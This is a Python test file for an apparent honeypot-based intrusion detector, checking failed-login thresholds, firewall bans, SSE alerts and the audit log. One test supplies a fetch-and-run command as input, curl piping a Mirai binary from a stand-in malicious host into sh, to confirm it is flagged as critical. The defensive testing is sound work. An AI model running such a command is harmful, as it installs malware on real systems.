import asyncio
import os
import tempfile
import time
import unittest

from controller.api.sse_broker import SSEBroadcaster
from controller.core.db import DefenseDatabase
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent
from controller.mitigation.allowlist import AllowlistManager
from controller.mitigation.firewall import FirewallController


class TestEndToEndAutonomousPipeline(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, "e2e_defense.db")
        self.db = DefenseDatabase(db_path=self.db_path)
        self.allowlist = AllowlistManager()
        self.firewall = FirewallController(allowlist_manager=self.allowlist, dry_run=True)
        self.broadcaster = SSEBroadcaster()

        self.received_alerts = []

        def on_mitigation(rec):
            self.received_alerts.append(rec)
            asyncio.create_task(self.broadcaster.broadcast("mitigation_alert", rec.to_dict()))

        self.detector = IntrusionDetector(
            firewall=self.firewall,
            db=self.db,
            allowlist=self.allowlist,
            failed_login_threshold=5,
            time_window_seconds=30.0,
            on_mitigation_callback=on_mitigation,
        )

    async def asyncTearDown(self) -> None:
        self.temp_dir.cleanup()

    async def test_sub_second_mitigation_latency(self) -> None:
        """Verifies autonomous detection to firewall drop executes in under 1,000 ms."""
        client_queue = await self.broadcaster.subscribe()
        attacker_ip = "198.51.100.222"

        # Prime with 4 failed attempts
        for i in range(4):
            self.detector.process_event(CowrieEvent(
                eventid="cowrie.login.failed",
                src_ip=attacker_ip,
                username="admin",
                password=f"pwd_{i}",
            ))

        self.assertFalse(self.firewall.is_ip_banned(attacker_ip))

        # 5th attempt breaches threshold - start benchmark
        start_time = time.perf_counter()
        res = self.detector.process_event(CowrieEvent(
            eventid="cowrie.login.failed",
            src_ip=attacker_ip,
            username="admin",
            password="pwd_threshold_breach",
        ))
        elapsed_ms = (time.perf_counter() - start_time) * 1000

        # Assertions
        self.assertIsNotNone(res)
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))
        self.assertLess(elapsed_ms, 1000.0, f"Autonomous reaction exceeded 1000ms ({elapsed_ms:.2f}ms)")
        print(f"\n[BENCHMARK] Autonomous mitigation closed-loop reaction time: {elapsed_ms:.3f} ms (< 1000 ms SLA)")

        # Verify SSE message was published
        sse_frame = await asyncio.wait_for(client_queue.get(), timeout=1.0)
        self.assertIn("event: mitigation_alert", sse_frame)
        self.assertIn(attacker_ip, sse_frame)

        # Verify SQLite audit trail
        history = self.db.get_history()
        self.assertEqual(len(history), 1)
        self.assertEqual(history[0]["src_ip"], attacker_ip)
        self.assertEqual(history[0]["action"], "IPTABLES_DROP")

    async def test_critical_payload_instant_containment(self) -> None:
        """Verifies shell injection triggers immediate CRITICAL mitigation."""
        attacker_ip = "203.0.113.199"
        res = self.detector.process_event(CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            input_command="curl -s http://malicious.net/mirai.arm7 | sh",
        ))
        self.assertIsNotNone(res)
        self.assertEqual(res.severity, "CRITICAL")
        self.assertTrue(self.firewall.is_ip_banned(attacker_ip))


if __name__ == "__main__":
    unittest.main()

